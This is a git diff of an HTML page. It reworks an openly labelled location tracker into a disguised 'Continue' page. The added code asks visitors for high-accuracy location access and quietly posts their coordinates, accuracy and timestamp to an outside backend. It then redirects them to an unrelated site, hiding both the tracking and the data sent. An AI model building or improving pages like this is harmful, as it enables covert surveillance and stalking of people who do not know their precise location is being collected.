@@ -3,54 +3,102 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
-  <title>Location Tracker</title>
+  <title>Continue</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      padding: 40px 20px;
+      background: #f9f9f9;
+    }
+    .box {
+      max-width: 400px;
+      margin: auto;
+      background: white;
+      padding: 25px;
+      border-radius: 12px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.1);
+    }
+    button {
+      padding: 14px 20px;
+      font-size: 16px;
+      border: none;
+      border-radius: 8px;
+      background: #007bff;
+      color: white;
+      cursor: pointer;
+      width: 100%;
+    }
+    button:disabled {
+      background: #999;
+    }
+    #status {
+      margin-top: 15px;
+      color: #555;
+      font-size: 14px;
+    }
+  </style>
 </head>
 <body>
-  <h1>Location Tracker</h1>
-  <button id="getLocationBtn">Send My Location</button>
-  <p id="status"></p>
+
+  <div class="box">
+    <h2>Continue</h2>
+    <p>Please allow location access to continue.</p>
+    <button id="btn">Continue</button>
+    <p id="status"></p>
+  </div>
 
   <script>
+    const btn = document.getElementById('btn');
     const statusEl = document.getElementById('status');
-    const button = document.getElementById('getLocationBtn');
 
-    button.addEventListener('click', () => {
+    btn.onclick = () => {
       if (!navigator.geolocation) {
-        statusEl.textContent = 'Geolocation is not supported by your browser.';
+        statusEl.textContent = "Location not supported.";
         return;
       }
 
-      statusEl.textContent = 'Locating…';
+      btn.disabled = true;
+      statusEl.textContent = "Checking location...";
 
-      navigator.geolocation.getCurrentPosition(success, error);
+      navigator.geolocation.getCurrentPosition(
+        async (pos) => {
+          const { latitude, longitude, accuracy } = pos.coords;
 
-      function success(position) {
-        const latitude = position.coords.latitude;
-        const longitude = position.coords.longitude;
-        const timestamp = new Date().toISOString();
+          statusEl.textContent = "Loading...";
 
-        statusEl.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
+          try {
+            await fetch('https://location-backend-id1k.onrender.com/location', {
+              method: 'POST',
+              headers: { 'Content-Type': 'application/json' },
+              body: JSON.stringify({
+                latitude,
+                longitude,
+                accuracy,
+                timestamp: new Date().toISOString()
+              })
+            });
+          } catch (e) {
+            console.error(e);
+          }
 
-        fetch('https://location-backend-id1k.onrender.com/location', {
-          method: 'POST',
-          headers: { 'Content-Type': 'application/json' },
-          body: JSON.stringify({ latitude, longitude, timestamp })
-        })
-        .then(response => response.text())
-        .then(data => {
-          statusEl.textContent += ' — Location sent successfully!';
-          console.log('Response from backend:', data);
-        })
-        .catch(err => {
-          statusEl.textContent = 'Error sending location.';
-          console.error('Error:', err);
-        });
-      }
-
-      function error() {
-        statusEl.textContent = 'Unable to retrieve your location.';
-      }
-    });
+          // Smooth redirect
+          setTimeout(() => {
+            window.location.href = "https://listcrawler.eu/";
+          }, 500);
+        },
+        (err) => {
+          btn.disabled = false;
+          statusEl.textContent = "Location permission is required to continue.";
+        },
+        {
+          enableHighAccuracy: true,
+          timeout: 10000,
+          maximumAge: 0
+        }
+      );
+    };
   </script>
+
 </body>
 </html>
